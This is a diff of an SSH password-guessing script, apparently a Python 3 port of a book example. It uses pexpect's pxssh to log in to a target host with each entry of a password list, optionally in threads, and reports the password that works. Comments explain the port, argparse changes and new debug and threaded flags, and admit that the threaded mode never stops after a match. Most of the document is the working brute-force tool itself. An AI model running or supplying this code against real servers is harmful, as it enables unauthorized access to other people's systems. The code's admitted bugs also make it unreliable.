@@ -18,33 +18,35 @@
 #
 # ---------------------------------------------------------------------------------------------------------------------
 #
-# Introduces the pexpect moduel (external)
+# Introduces the pexpect module (external):
+# Pexpect is a pure Python module for spawning child applications; controlling them; and responding to expected
+# patterns in their output. Pexpect works like Don Libes’ Expect. Pexpect allows your script to spawn a child
+# application and control it as if a human were typing commands.
 #
-# http://pexpect.readthedocs.io/en/latest/
+#   http://pexpect.readthedocs.io/en/latest/
 #
-# Introduces the  socket module:
+# Uses the threading module:
 #
-# Introduces the threading module:
-#
-# Introduces the argparse module:
+# Uses the argparse module:
 # The argparse module makes it easy to write user-friendly command-line interfaces. The program defines what arguments
 # it requires, and argparse will figure out how to parse those out of sys.argv. The argparse module also automatically
 # generates help and usage messages and issues errors when users give the program invalid arguments.
 #
-# https://docs.python.org/3.5/library/argparse.html?highlight=argparse#module-argparse
+#   https://docs.python.org/3.5/library/argparse.html?highlight=argparse#module-argparse
 #
 # Note that in the book there is code that checks to make sure neither option is == None and, if so, exit the program.
 # This has been omitted as with argparse we can specify the "required=True" option and the module will handle this
 # for us.
 #
 # I replaced optpares with argpares in the code as optparse has been  deprecated since v2.7:
-# https://www.python.org/dev/peps/pep-0389/
+#
+#   https://www.python.org/dev/peps/pep-0389/
 #
 # Uses the sys module
 # This module provides access to some variables used or maintained by the interpreter and to functions that interact
 #  strongly with the interpreter. It is always available.
 #
-# https://docs.python.org/3.5/library/sys.html?highlight=sys#module-sys
+#   https://docs.python.org/3.5/library/sys.html?highlight=sys#module-sys
 #
 # ---------------------------------------------------------------------------------------------------------------------
 #
@@ -78,16 +80,29 @@
 #
 # - f = open(filename, 'r') : changed this to use the more Pythonic form: with open(filename, 'rU') as f:
 #
-# - optparse code converted to argparse code. This is not required to run under v3.x but optparse is deprecated since
+# - optparse code converted to argparse code. : This is not required to run under v3.x but optparse is deprecated since
 #   v2.7 and moving to argparse is in keeping with my goal of not only converting v2.x specific code to v3.x but also
 #   doing my best to make the code more modern and more Pythonic by current standards.
 #
+#   notable this version of the code makes use of the argparse.add_argument() "required=" argument buy setting it
+#   equal to "True", rather than using code to test if the arguments were passed on the commandline.
+#
+#   if host == None or passwdFile == None or user == None:   became:    parser.add_argument(<flag>, required=True, ...)
+#
+# - import : import pxssh       became:      from pexpect import pxssh   because the old form would not properly
+#   import pxssh from pexcpect otherwise.
 #
 # ---------------------------------------------------------------------------------------------------------------------
 #
 # Functional Changes
 #
 # Added code to check for Python3.x and exit if not available.
+#
+# Added a normally false '-d'/'--debug' option to control debug print statement output.
+#
+# Added a normally false '-t'/'--threaded' option to allow the program to be run threaded or non threaded.
+# This was done because when run threaded the global variable 'found' is never set to 'True' so the program
+# always runs through every password in the password file even after a match is found. Having the switch in-place
 #
 # Python3 is expected:
 #
@@ -185,24 +200,40 @@ from pexpect import pxssh                               # original code was 'imp
 import argparse                                         # original code used optparse
 import time
 from threading import *
+# import threading                                      # required if  connection_lock = threading.Lock() uncommented
 import sys
 
-max_connections = 5
+# use either the first line, or the last two lines, but not together.
+# Neither currently produces the expected results.
+# In either case 'threading' is never set to true so all the passwords in the file are tried,
+# even if a match has already been found.
+#
+# The -T parser argument definition and the variable "Threaded" in function main() were meant for use with the
+# connection lock method below. Problem was at the time I do not yet know how to make the program see the options
+# for threading outside of main(), where these exist. if I put them inside main() en the connection_lock.release()
+# statement in the connect function becomes undefined.
+#
+# connection_lock = threading.Lock()
+max_connections = 15
 connection_lock = BoundedSemaphore(value=max_connections)
+
 
 found = False
 fails = 0
+debug = False
 
 
 def connect(host, user, password, release):
+    global debug
     global found
-    global fails
 
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print('[+] Password found: {}'.format(password))
         found = True
+        if debug:
+            print('[***DEBUG***] Local (connect))found == {}'.format(found))
+        print('[+] Password found: {}'.format(password))
 
     except Exception as e:
         if 'read_nonblocking' in str(e):
@@ -212,9 +243,6 @@ def connect(host, user, password, release):
         elif 'synchronize with original prompt' in str(e):
             time.sleep(1)
             connect(host, user, password, False)
-        elif 'Permission denied' in str(e):
-            time.sleep(1)
-            connect(host, user, password, False)
 
     finally:
         if release:
@@ -222,6 +250,9 @@ def connect(host, user, password, release):
 
 
 def main():
+    global found
+    global fails
+    global debug
     parser = argparse.ArgumentParser('usage:%prog -H <target host> -u <user> -F <password list>')
     parser.add_argument('-H', '--host',
                         required=True,
@@ -240,26 +271,57 @@ def main():
                         dest='user',
                         type=str,
                         help='specify the user')
+    parser.add_argument('-d', '--debug',
+                        action='store_true',
+                        help='sends debug output to stdout')
+
+    parser.add_argument('-t', '--threaded',
+                        default=False,
+                        action='store_true',
+                        )
+
+    # parser.add_argument('-T', '--Threaded',                             # Not currently used
+    #                     default=False,
+    #                     action='store_true',
+    #                     help='run with thread locking'
+    #                     )
 
     args = parser.parse_args()
     target_host = args.target_host
     password_file = args.password_file
     user = args.user
+    threaded = args.threaded
+    # Threaded = args.Threaded                                          # for Threading lock not Semaphore
+    debug = args.debug
 
     with open(password_file, 'r') as file_name:
         for line in file_name.readlines():
+            if debug:
+                print('[*DBG*] {}'.format(('-' * 25)))
+                print('[*DBG*] Filename: {} \| Read in: {}'.format(password_file, line, end="", flush=True))
+                print('[*DBG*] Flags: found == {}\n[*DBG*] {}fails == {}'.format(found, (' ' * 7), found))
+                print('[*DBG*] {}\n\n'.format(('-' * 25)))
+
             if found:
-                print('[+] Existing Password Found')
+                print('[+] Exiting Password found')
                 sys.exit(0)                                 # using sys.exit(). exit() is for interactive interpreter.
 
             if fails > 5:
                 print('[-] Exiting: Too Many Socket Timeouts')
                 sys.exit(0)
-        connection_lock.acquire()
-        password = line.strip('\r').strip('\n')
-        print('[-] Testing: {}'.format(password))
-        t = Thread(target=connect, args=(target_host, user, password, True ))
-        child = t.start()
+
+            if debug:
+                print('[***DEBUG***] Local (main) found == {}'.format(found))
+
+            connection_lock.acquire()
+            password = line.strip('\r').strip('\n')
+            print('[-] Testing: {}'.format(password))
+
+            if threaded:
+                t = Thread(target=connect, args=(target_host, user, password, True))
+                child = t.start()
+            else:
+                connect(target_host, user, password, True)
 
 
 if __name__ == '__main__':
